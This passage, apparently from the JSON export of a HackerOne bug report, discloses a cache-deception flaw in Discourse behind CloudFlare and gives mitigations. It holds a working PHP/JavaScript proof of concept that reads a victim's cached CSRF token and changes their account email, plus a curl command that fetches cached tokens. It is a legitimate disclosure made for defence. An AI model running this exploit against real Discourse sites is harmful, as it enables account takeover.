4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=657c222873bc3af056b38e9133443cc8a8fb12f3bdbf60b4f9b9fbba40bb2a0c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.56.30.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.56.30.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=657c222873bc3af056b38e9133443cc8a8fb12f3bdbf60b4f9b9fbba40bb2a0c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"mitigations\"\u003eMitigations\u003c/h3\u003e\n\n\u003cp\u003eAdd the \u003ccode\u003eno-cache\u003c/code\u003e headers, \u003ccode\u003eCache-Control\u003c/code\u003e and/or \u003ccode\u003eExpire\u003c/code\u003e on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the \u003ccode\u003eX-Discourse-Username\u003c/code\u003e is returned.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need any additional information.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","bounty_amount":"256.0","formatted_bounty":"$256","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":213373,"file_name":"Screen_Shot_2017-08-16_at_14.07.00.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.07.00.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.07.00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026X-Amz-Signature=2bf5772cbc1cc23943614be89338b4abeb464513e20ff573b018fd620e2b1b47","file_size":14420,"type":"image/png"},{"id":213374,"file_name":"Screen_Shot_2017-08-16_at_14.56.30.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.56.30.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.56.30.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026X-Amz-Signature=657c222873bc3af056b38e9133443cc8a8fb12f3bdbf60b4f9b9fbba40bb2a0c","file_size":296625,"type":"image/png"}],"allow_singular_disclosure_at":"2018-08-08T18:00:09.704Z","allow_singular_disclosure_after":-75467682.45363827,"singular_disclosure_allowed":true,"vote_count":49,"voters":["jokebookservice1","kapytein","foobar7","dawgyg","bogdantcaciuc","spam404","marotagem_vrt","mygf","asad0x01_","michan","and 39 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1961214,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @fransrosen, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T20:18:09.487Z","updated_at":"2017-08-28T20:18:09.487Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2284063,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\nSorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.\n\nThe bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so `_forum_session` is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I'm testing with Firefox 57.0.4 in macOS 10.13.2.\n\nYou need to run the PHP-code in the same region as you're in when trying, this is because the CloudFlare region is the one doing the cache of `.css`. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.\n\nMy code looks like this in the demo:\n\n```php\n\u003c?\n$discourse = \"https://discourse.algolia.com\";\n$email_to_change_to = \"test99990@yoski.co\";\n$file = \"/u/%d.css\";\n\nif(!empty($_GET['fetch'])) {\n\t$f = @intval($_GET['f']);\n\t$file = sprintf($file, $f);\n\t$ctx = stream_context_create(array('http' =\u003e array('ignore_errors' =\u003e true)));\n\t$data = file_get_contents($discourse.$file, false, $ctx);\n\tpreg_match('/name=\"csrf-token\" content=\"([a-zA-Z0-9\\/=+]+)\"/', $data, $matches);\n\tif(!empty($matches[1])) {\n\t\tpreg_match('/X-Discourse-Username: (.*)/', implode(\"\\n\", $http_response_header), $name_matches);\n\t\techo $matches[1].';'.$name_matches[1];\n\t} else {\n\t\techo 'error';\n\t}\n\texit;\n}\n#random file to taint with csrf-token\n$rand = mt_rand(100000,999999);\n$file = sprintf($file, $rand);\n?\u003e\n\u003chtml\u003e\n  \u003cbody\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" /\u003e\n\t\u003cimg src=\"\u003c?=$discourse.$file?\u003e\" onerror=\"f()\" /\u003e\n\u003cscript\u003e\nvar user = '', change_email_to = '\u003c?=$email_to_change_to?\u003e';\nfunction f() {\n\tfetch('?fetch=1\u0026f=\u003c?=$rand?\u003e').then(function(e){return e.text()}).then(function(e){\n\t\tif(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }\n\t\tuser = e.split(';')[1];\n\t\tdocument.getElementById('f').action = '\u003c?=$discourse?\u003e/users/'+user+'/preferences/email'\n\t\tsubmitRequest(e.split(';')[0])\n\t})\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n\tif(xhr.readyState == 4) {\n\t\talert('Account email for ' + user + ' has been changed to: ' + change_email_to);\n\t}\n  };\n  xhr.open(\"POST\", \"\u003c?=$discourse?\u003e/users/\"+user+\"/preferences/email.json\", true);\n  xhr.setRequestHeader(\"Accept\", \"text\\/html\");\n  xhr.setRequestHeader(\"Content-Type\", \"application\\/x-www-form-urlencoded\");\n  xhr.withCredentials = true;\n  var body = \"_method=PUT\u0026email=\" + encodeURIComponent(change_email_to) +\"\u0026authenticity_token=\" + encodeURIComponent(csrf);\n  var aBody = new Uint8Array(body.length);\n  for (var i = 0; i \u003c aBody.length; i++)\n    aBody[i] = body.charCodeAt(i); \n  xhr.send(new Blob([aBody]));\n}\n\u003c/script\u003e\n    \u003cform action=\"\" id=\"f\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"PUT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"email\" value=\"\u003c?=$email_to_change_to?\u003e\" /\u003e\n      \u003cinput type=\"hidden\" name=\"authenticity\u0026#95;token\" id=\"csrf\" value=\"\" /\u003e\n      \u003cinput type=\"submit\" style=\"display: none;\" value=\"Submit request\" /\u003e\n\t  Please wait...\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nAnd the flow looks like this:\n\n1. Sign up for Algolia at https://www.algolia.com/users/sign_up\n2. When done, go to https://discourse.algolia.com/ and \"Log in\"\n3. Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: `php -S localhost:8000 algolia.php`\n4. Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.\n5. Go to `http://localhost:8000` in Firefox.\n\nYou should see an alert that the email was changed. This is also the point when the attacker gets a \"Confirm your new address\" to their inbox as my video shows.\n\nPoC-video:\n{F253981}\n\nThe reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it's a CSS-file. If there would be a `Cache-Control: no-cache` whenever CSRF-tokens are in the templates, this attack would not work.\n\nAlso, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user's CSRF-token when the file was requested, which is the one I'm using to trigger the email-change:\n\n{F253980}\n{F253979}\n```\nlocal @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token\n\u003cmeta name=\"csrf-token\" content=\"CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw==\" /\u003e\n```\n\nThe only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you're using CloudFlare's proxy to speed up the website and to hide the origin and sometimes make sure you're protected against DDoS.\n\nHope this helps, and sorry for my late reply.\n\nRegards,\nFrans\n\n","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nSorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.\u003c/p\u003e\n\n\u003cp\u003eThe bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so \u003ccode\u003e_forum_session\u003c/code\u003e is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I\u0026#39;m testing with Firefox 57.0.4 in macOS 10.13.2.\u003c/p\u003e\n\n\u003cp\u003eYou need to run the PHP-code in the same region as you\u0026#39;re in when trying, this is because the CloudFlare region is the one doing the cache of \u003ccode\u003e.css\u003c/code\u003e. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.\u003c/p\u003e\n\n\u003cp\u003eMy code looks like this in the demo:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;https://discourse.algolia.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;test99990@yoski.co\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/u/%d.css\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fetch\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$f\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nb\"\u003eintval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;f\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$f\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$ctx\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estream_context_create\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ignore_errors\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)));\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efile_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ctx\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;([a-zA-Z0-9\\/=+]+)\u0026quot;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/X-Discourse-Username: (.*)/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_response_header\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nv\"\u003e$name_matches\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$name_matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e#random file to taint with csrf-token\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003emt_rand\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e100000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e999999\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan 